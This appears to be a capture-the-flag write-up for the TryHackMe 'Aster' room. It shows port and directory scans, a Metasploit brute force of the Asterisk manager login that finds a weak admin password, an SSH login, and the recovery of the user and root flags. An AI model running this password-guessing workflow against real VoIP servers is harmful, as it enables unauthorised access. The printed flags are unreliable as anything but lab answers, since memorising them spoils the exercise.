# [Aster](https://tryhackme.com/room/aster)

![logo](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Aster/aster.png)
## Hack my server dedicated for building communications applications.
# #1
### les't get started scan network using nmap

~~~
Host is up (0.21s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fee3520650932e3f7aaafc69ddcd14a2 (RSA)
|   256 9c4dfda44e18cae2c001848cd27a51f2 (ECDSA)
|_  256 c593a60c018a6863d78416dc2c0a961d (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Aster CTF
|_http-server-header: Apache/2.4.18 (Ubuntu)
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
~~~
[](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Aster/port80.png)
# #2 
We discover a hidden directory service using gobuster
~~~
┌──(alpha㉿sploit)-[~/ctf/aster]
└─$ gobuster dir -u http://10.10.115.33/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.115.33/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/20 14:49:57 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.115.33/images/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.115.33/assets/]
~~~
![something](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Aster/Untitled.png)

~~~
┌──(alpha㉿sploit)-[~/ctf/aster]
└─$ ls
notes.txt  output.pyc  test.py
                                                                                                                                                                       
┌──(alpha㉿sploit)-[~/ctf/aster]
└─$ msfconsole                                                                                                                        
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.3.21-dev                          ]
+ -- --=[ 2327 exploits - 1218 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can pivot connections over sessions 
started with the ssh_login modules
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search asterisk

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank       Check  Description
   -  ----                                                   ---------------  ----       -----  -----------
   0  auxiliary/gather/asterisk_creds                                         normal     No     Asterisk Gather Credentials
   1  auxiliary/voip/asterisk_login                                           normal     No     Asterisk Manager Login Utility
   2  exploit/linux/http/grandstream_ucm62xx_sendemail_rce   2020-03-23       excellent  Yes    Grandstream UCM62xx IP PBX sendPasswordEmail RCE
   3  exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce  2020-04-28       excellent  Yes    TrixBox CE endpoint_devicemap.php Authenticated Command Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce

msf6 > use 1
msf6 auxiliary(voip/asterisk_login) > options

Module options (auxiliary/voip/asterisk_login):

   Name              Current Setting                                 Required  Description
   ----              ---------------                                 --------  -----------
   BLANK_PASSWORDS   false                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                           no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                            no        Skip existing credentials stored in the current database (Accepted: none, user, user&r
                                                                               ealm)
   PASSWORD                                                          no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists  no        The file that contains a list of probable passwords.
                     /unix_passwords.txt
   RHOSTS                                                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
                                                                               -metasploit.html
   RPORT             5038                                            yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                           yes       Stop guessing when a credential works for a host
   THREADS           1                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                          no        A specific username to authenticate as
   USERPASS_FILE                                                     no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists  no        The file that contains a list of probable users accounts.
                     /unix_users.txt
   VERBOSE           true                                            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(voip/asterisk_login) > set RHOSTS    RHOSTS                                                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
RHOSTS => RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
msf6 auxiliary(voip/asterisk_login) > set RHOSTS 10.10.115.33
RHOSTS => 10.10.115.33
msf6 auxiliary(voip/asterisk_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(voip/asterisk_login) > run

[*] 10.10.115.33:5038     - Initializing module...
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'admin'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'123456'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'12345'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'123456789'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'password'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'iloveyou'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'princess'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'1234567'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'12345678'
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'admin' with password:'abc123'
[+] 10.10.115.33:5038     - User: "admin" using pass: "abc123" - can login on 10.10.115.33:5038!
[!] 10.10.115.33:5038     - No active DB -- Credential data will not be saved!
[*] 10.10.115.33:5038     - 10.10.115.33:5038 - Trying user:'' with password:'admin'
~~~

~~~
──(alpha㉿sploit)-[~/ctf/aster]
└─$ sudo telnet 10.10.115.33 5038            
Trying 10.10.115.33...
Connected to 10.10.115.33.
Escape character is '^]'.
Asterisk Call Manager/5.0.2
Connection closed by foreign host.
~~~
ssh username and password
~~~
┌──(alpha㉿sploit)-[~/ctf/aster]
└─$ ssh harry@10.10.115.33       
The authenticity of host '10.10.115.33 (10.10.115.33)' can't be established.
ED25519 key fingerprint is SHA256:8Awxa1+U8ihfrilnopXoNcUHTvVbAVhtZPk4RWox5tM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.115.33' (ED25519) to the list of known hosts.
harry@10.10.115.33's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Wed Aug 12 14:25:25 2020 from 192.168.85.1
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ cat user.txt 
thm{bas1c_aster1ck_explotat1on}
~~~
~~~
root flag
harry@ubuntu:~$ sudo su
[sudo] password for harry: 
harry@ubuntu:~$ sudo -l
[sudo] password for harry: 
Sorry, user harry may not run sudo on ubuntu.
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ ls -la
total 52
drwxr-xr-x 5 harry harry    4096 Aug 12  2020 .
drwxr-xr-x 3 root  root     4096 Aug 10  2020 ..
-rw------- 1 root  asterisk  171 Aug 10  2020 .asterisk_history
-rw------- 1 root  root     3117 Aug 12  2020 .bash_history
-rw-r--r-- 1 harry harry     220 Aug 10  2020 .bash_logout
-rw-r--r-- 1 harry harry    3771 Aug 10  2020 .bashrc
drwx------ 2 harry harry    4096 Aug 10  2020 .cache
-rw-rw-r-- 1 harry harry    1094 Aug 12  2020 Example_Root.jar
drwxrwxr-x 2 harry harry    4096 Aug 10  2020 .nano
-rw-r--r-- 1 harry harry     655 Aug 10  2020 .profile
drwxr-xr-x 3 root  root     4096 Aug 10  2020 .subversion
-rw-r--r-- 1 harry harry       0 Aug 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 harry harry      32 Aug 11  2020 user.txt
-rw-r--r-- 1 root  root      233 Aug 12  2020 .wget-hsts
harry@ubuntu:~$ history
    1  ls
    2  cat user.txt 
    3  sudo su
    4  sudo -l
    5  ls
    6  ls -la
    7  history
harry@ubuntu:~$ python3 -m http.server 4545
Serving HTTP on 0.0.0.0 port 4545 ...
10.8.5.88 - - [20/Aug/2023 12:41:01] "GET / HTTP/1.1" 200 -
10.8.5.88 - - [20/Aug/2023 12:41:02] code 404, message File not found
10.8.5.88 - - [20/Aug/2023 12:41:02] "GET /favicon.ico HTTP/1.1" 404 -
10.8.5.88 - - [20/Aug/2023 12:41:16] "GET /user.txt HTTP/1.1" 200 -
10.8.5.88 - - [20/Aug/2023 12:41:20] "GET /.nano/ HTTP/1.1" 200 -
10.8.5.88 - - [20/Aug/2023 12:41:59] "GET /Example_Root.jar HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
~~~
[javadecompilers](http://www.javadecompilers.com/result?currentfile=Example_Root.java)

![Untitled1](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Aster/Untitled%20(1).png)
~~~

harry@ubuntu:~$ touch /tmp/flag.dat
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ cat user.txt 
thm{bas1c_aster1ck_explotat1on}
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ ls -la
total 52
drwxr-xr-x 5 harry harry    4096 Aug 12  2020 .
drwxr-xr-x 3 root  root     4096 Aug 10  2020 ..
-rw------- 1 root  asterisk  171 Aug 10  2020 .asterisk_history
-rw------- 1 root  root     3117 Aug 12  2020 .bash_history
-rw-r--r-- 1 harry harry     220 Aug 10  2020 .bash_logout
-rw-r--r-- 1 harry harry    3771 Aug 10  2020 .bashrc
drwx------ 2 harry harry    4096 Aug 10  2020 .cache
-rw-rw-r-- 1 harry harry    1094 Aug 12  2020 Example_Root.jar
drwxrwxr-x 2 harry harry    4096 Aug 10  2020 .nano
-rw-r--r-- 1 harry harry     655 Aug 10  2020 .profile
drwxr-xr-x 3 root  root     4096 Aug 10  2020 .subversion
-rw-r--r-- 1 harry harry       0 Aug 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 harry harry      32 Aug 11  2020 user.txt
-rw-r--r-- 1 root  root      233 Aug 12  2020 .wget-hsts
harry@ubuntu:~$ ls
Example_Root.jar  root.txt  user.txt
harry@ubuntu:~$ cat root.txt 
thm{fa1l_revers1ng_java}harry@ubuntu:~$ ls
Example_Root.jar  root.txt  user.txt
harry@ubuntu:~$ cat root.txt 
thm{fa1l_revers1ng_java}harry@ubuntu:~$
~~~
